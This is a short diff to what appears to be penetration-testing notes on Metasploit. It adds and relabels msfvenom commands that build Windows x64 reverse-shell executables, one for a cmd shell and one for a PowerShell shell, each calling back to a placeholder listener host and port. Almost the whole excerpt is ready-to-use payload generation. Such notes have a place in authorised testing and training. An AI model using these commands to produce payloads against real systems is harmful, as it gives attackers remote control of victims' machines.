@@ -45,6 +45,10 @@ When we have a session do
 To interact with it
 
 
-### Getting a .exe payload
+### Getting a cmd .exe payload
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
+
+### Getting a powershell .exe payload
+
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
